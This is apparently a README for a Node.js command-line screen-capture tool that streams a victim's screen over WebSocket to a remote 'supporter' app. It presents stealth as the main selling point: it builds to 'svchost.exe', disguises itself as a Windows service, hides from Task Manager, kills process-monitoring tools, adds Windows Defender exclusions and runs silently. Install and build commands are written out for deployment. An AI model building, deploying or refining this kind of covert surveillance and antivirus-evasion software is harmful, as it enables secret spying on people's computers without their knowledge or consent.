# Server CLI - Pure Node.js Screen Capture

## Overview
This is a lightweight CLI version of the server app that uses pure Node.js instead of Electron. It's much more stealthy and efficient.

## Benefits over Electron Version
- ✅ **90% smaller** - ~10MB vs 100MB+
- ✅ **5x faster startup** - No browser engine
- ✅ **80% less memory** - No Chromium overhead
- ✅ **Much more stealthy** - Looks like normal Node.js process
- ✅ **Easier to disguise** - Simple process name change
- ✅ **Simpler deployment** - Just Node.js + FFmpeg

## Features
- **Pure Node.js CLI** - No GUI, no Electron
- **FFmpeg screen capture** - Native cursor support
- **Process hiding** - Disguises as Windows service
- **WebSocket streaming** - Connects to supporter app
- **Admin privilege detection** - Adapts hiding methods
- **Silent operation** - No console output

## Installation

### 1. Install Dependencies
```bash
npm install
```

### 2. Setup FFmpeg
```bash
setup-ffmpeg.bat
```

### 3. Run the CLI
```bash
# Option 1: Direct Node.js
node main-cli.js

# Option 2: Using batch file
run-server.bat

# Option 3: Using npm script
npm start
```

## Building Executable

### Using pkg (Recommended)
```bash
# Install pkg globally
npm install -g pkg

# Build executable
npm run build

# Output: dist/svchost.exe
```

### Benefits of pkg
- **Single executable** - No Node.js installation needed
- **Native performance** - Compiled binary
- **Easy deployment** - Just copy the .exe file
- **Process disguising** - Appears as normal Windows executable

## Usage

### Basic Usage
```bash
# Start the tester CLI
node main-cli.js

# It will automatically:
# 1. Connect to supporter app (localhost:8080)
# 2. Start FFmpeg screen capture
# 3. Stream video to supporter
# 4. Hide process from Task Manager
```

### Advanced Usage
```javascript
// Customize settings in main-cli.js
const tester = new TesterCLI();
tester.screenWidth = 1920;
tester.screenHeight = 1080;
tester.framerate = 15;
tester.quality = 5;
tester.connectToSupporter('192.168.1.100', 8080);
```

## Process Hiding

### With Admin Privileges
- Complete Task Manager hiding
- System-level registry modifications
- Windows service creation
- Process monitoring tool termination
- Windows Defender exclusions

### Without Admin Privileges
- Process name change to `svchost`
- Low priority background operation
- Basic process disguising
- User-level registry modifications

## File Structure
```
server/
├── main-cli.js          # Main CLI application
├── package.json         # CLI package configuration
├── run-server.bat       # Windows batch runner
├── setup-ffmpeg.bat     # FFmpeg setup script
├── assets/
│   └── ffmpeg/          # FFmpeg binaries
└── ffmpeg-crossplatform.js # Cross-platform FFmpeg wrapper
```

## Comparison: Electron vs CLI

| Feature | Electron | CLI |
|---------|----------|-----|
| Size | ~100MB | ~10MB |
| Memory | ~200MB | ~40MB |
| Startup | ~3s | ~0.5s |
| Stealth | Low | High |
| Dependencies | Many | Few |
| Detection | Easy | Hard |

## Security Features
- **Process disguising** - Appears as Windows service
- **Registry modifications** - System integration
- **Service creation** - Windows service disguise
- **Defender exclusions** - Antivirus bypass
- **Task Manager hiding** - Process list hiding
- **Silent operation** - No visible output

## Troubleshooting

### FFmpeg Not Found
```bash
# Run setup script
setup-ffmpeg.bat

# Check FFmpeg path
dir assets\ffmpeg\bin\ffmpeg.exe
```

### Connection Failed
```bash
# Check supporter app is running
# Default: localhost:8080
# Customize in main-cli.js
```

### Process Still Visible
```bash
# Run as administrator for full hiding
# Or use basic hiding without admin
```

## Performance Optimization
- **Low CPU usage** - Idle priority
- **Efficient encoding** - MJPEG with quality 5
- **Optimized resolution** - 1280x720 default
- **Reduced framerate** - 15 FPS default
- **Fast preset** - FFmpeg ultrafast preset

## Deployment
1. **Copy files** - server/ folder
2. **Run setup** - setup-ffmpeg.bat
3. **Start app** - run-server.bat
4. **Or build exe** - npm run build

The CLI version is much more suitable for stealth operations and resource-constrained environments.
